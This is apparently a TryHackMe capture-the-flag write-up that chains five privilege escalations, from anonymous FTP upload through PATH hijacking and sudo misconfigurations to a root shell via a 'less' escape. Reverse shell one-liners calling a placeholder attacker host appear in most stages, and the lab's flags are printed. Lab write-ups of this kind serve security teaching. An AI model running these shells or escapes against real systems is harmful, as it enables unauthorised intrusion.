# JUMP - Multi-User Privilege Escalation Chain

**Target:** `10.48.184.199` (hostname: `tryhackme-2404`)
**Goal:** Escalate from anonymous access through `recon_user → dev_user → monitor_user → ops_user → root`

## Summary

This box chains together five separate privilege escalation vectors, each relying on
misconfigured file/group permissions or unsanitized `sudo` rules. The overall pattern:
group-writable scripts and PATH-hijackable binaries that get executed by an automated
process or service running as the next user in the chain.

---

## Stage 0: Initial Access via Anonymous FTP

Nmap/service discovery revealed an FTP server (vsFTPd 3.0.5) allowing anonymous login.

```bash
ftp 10.48.184.199
Name: anonymous
Password: (blank)
```

Directory listing revealed two folders:

```
drwxrwxrwx  incoming
drwxr-xr-x  pub
```

`pub/README.txt` contained the key clue:

```
[ recon pipeline ]
All recon jobs must be placed in incoming/.
Files are processed automatically on arrival.
Invalid formats are ignored.
```

This confirmed `incoming/` is a watched directory with automatic execution of dropped files.

### Exploitation

Uploaded a reverse shell script:

```bash
#!/bin/bash
sh -i >& /dev/tcp/<attacker_ip>/5555 0>&1
```

```bash
ftp> cd incoming
ftp> put shell.sh
```

With a listener running (`nc -lvnp 5555`), the file was picked up and executed automatically,
returning a shell as **`recon_user`**.

**Flag:** `THM{5a3f1c92-7b4e-4d91-8c2a-1f6e9b2a4c11}`

---

## Stage 1: recon_user → dev_user

### Enumeration

```bash
id
# uid=1001(recon_user) groups=1001(recon_user),1002(dev_user),1005(devops)
```

`recon_user` is a secondary member of the `dev_user` group. Searching for group-owned files:

```bash
find / -group dev_user 2>/dev/null
```

Revealed:
```
/opt/dev/backup.sh          (owned by dev_user:dev_user, group-writable)
/opt/dev/bin/ps              (owned by dev_user:dev_user)
/home/dev_user/flag.txt
```

`backup.sh` was group-writable (`rwxrwxr-x`) and its matching timestamp with an existing
`/tmp/recon_backup.tgz` output confirmed it had already been executed once — by some
automated mechanism running as `dev_user` (a systemd timer, not classic cron, since
`/etc/crontab` and `/etc/cron.d` showed nothing relevant).

### Exploitation

Since group membership granted write access, the script was appended with a reverse shell:

```bash
echo 'bash -c "bash -i >& /dev/tcp/<attacker_ip>/6666 0>&1"' >> /opt/dev/backup.sh
```

With a listener on port 6666, the automated execution mechanism re-ran `backup.sh`,
returning a shell as **`dev_user`**.

**Flag:** `THM{8d2b7a41-3f9c-4e55-b1a2-6c7d9e8f0123}`

---

## Stage 2: dev_user → monitor_user

### Enumeration

```bash
find / -group monitor_user 2>/dev/null
```

Found:
```
/usr/local/bin/healthcheck   (owned by monitor_user, world-readable script)
/opt/app/deploy_helper.sh    (owned by monitor_user)
/var/log/monitor.log
```

Inspecting `healthcheck`:

```bash
#!/bin/bash
echo "Running as: $(whoami)"
while true; do
  ps aux | grep -v grep
  sleep 5
done
```

Key finding: the script calls `ps` **without an absolute path**. Since `/opt/dev/bin`
(writable by the `dev_user` group, which `dev_user` belongs to) precedes the system `ps`
binary in `monitor_user`'s effective `$PATH`, this is a classic **PATH hijack**.

### Exploitation

A malicious `ps` binary was placed in the hijackable directory:

```bash
printf '#!/bin/bash\n' > /opt/dev/bin/ps
printf 'bash -i >& /dev/tcp/<attacker_ip>/5557 0>&1\n' >> /opt/dev/bin/ps
chmod +x /opt/dev/bin/ps
```

Since `healthcheck` loops every 5 seconds calling bare `ps`, the fake binary was picked up
almost immediately, returning a shell as **`monitor_user`**.

**Flag:** `THM{c1e9a7b3-2d44-4a88-9f7e-3b6c2d5a9f77}`

---

## Stage 3: monitor_user → ops_user

### Enumeration

```bash
sudo -l
```

```
User monitor_user may run the following commands on tryhackme-2404:
    (ops_user) NOPASSWD: /usr/local/bin/deploy.sh
```

Inspecting `deploy.sh`:

```bash
#!/bin/bash
cd /opt/app 2>/dev/null
./deploy_helper.sh
```

`deploy_helper.sh` (found earlier) is owned by **`monitor_user`** — the current user — and
is called via a relative path. Since `monitor_user` can freely edit a file it owns, and
`deploy.sh` is sudo-executable as `ops_user`, this is a direct privilege bridge.

### Exploitation

```bash
printf '#!/bin/bash\n' > /opt/app/deploy_helper.sh
printf 'bash -i >& /dev/tcp/<attacker_ip>/3333 0>&1\n' >> /opt/app/deploy_helper.sh
chmod +x /opt/app/deploy_helper.sh

sudo -u ops_user /usr/local/bin/deploy.sh
```

With a listener on port 3333, this returned a shell as **`ops_user`**.

**Flag:** `THM{f7a2c9d1-6e33-4b55-8d11-9c0a7b2e4d88}`

---

## Stage 4: ops_user → root

### Enumeration

```bash
sudo -l
```

```
User ops_user may run the following commands on tryhackme-2404:
    (root) NOPASSWD: /usr/bin/less
```

`less` is a well-known [GTFOBins](https://gtfobins.github.io/gtfobins/less/) sudo-escalation
vector — it supports a shell-escape (`!`) from within its pager interface.

### Exploitation

```bash
sudo /usr/bin/less /etc/hosts
```

**Gotcha encountered:** the initial reverse shell (raw `nc` / `bash -i`) was not a fully
allocated TTY, so `less` printed a `WARNING: terminal is not fully functional` message and
did not behave as a normal interactive pager. Upgrading to a proper PTY fixed this:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

After the PTY upgrade, running `less` again produced the same warning once more (expected,
since the underlying terminal still isn't 100% capable) — pressing **Enter** to dismiss it
allowed `less` to display the file and remain in pager mode at `(END)`.

At that point, the classic [GTFOBins](https://gtfobins.github.io/gtfobins/less/) shell escape
worked as documented:

```
!/bin/sh
```

This spawned a **root shell**, confirmed with:

```bash
whoami
# root
```

```bash
cat /root/flag.txt
```

**Flag:** `THM{2b8e6c4a-1d55-4f90-a3c7-5e9d1b7f6a22}`

---

## Key Takeaways

| Stage | Vector | Root Cause |
|---|---|---|
| Anonymous → recon_user | Auto-executed FTP upload | World-writable "processing" directory with no format/authenticity validation |
| recon_user → dev_user | Group-writable script + automated execution | Overly permissive group write bit on a script run by a scheduler |
| dev_user → monitor_user | PATH hijack | Script invoking `ps` without an absolute path, combined with a writable directory earlier in `$PATH` |
| monitor_user → ops_user | Sudo rule + self-owned dependency | `NOPASSWD` sudo rule executing a wrapper that calls a script the invoking user already owns |
| ops_user → root | GTFOBins sudo misconfiguration | `NOPASSWD` sudo rule on a binary (`less`) with a well-known shell escape |

**Practical note on the final stage:** a raw `bash -i >& /dev/tcp/...` reverse shell does not
allocate a full TTY, which can cause interactive full-screen programs (`less`, `vim`, `top`,
etc.) to misbehave or auto-exit instead of entering pager/editor mode. Upgrading to a proper
PTY with `python3 -c 'import pty; pty.spawn("/bin/bash")'` resolved this and allowed the
standard `!/bin/sh` GTFOBins escape to work as documented.

**General lesson:** this chain is a textbook demonstration of why group-writable files,
relative-path/bare-name command invocations in privileged scripts, and broad `NOPASSWD`
sudo rules on GTFOBins-listed binaries are dangerous even when each individual
misconfiguration seems minor in isolation.
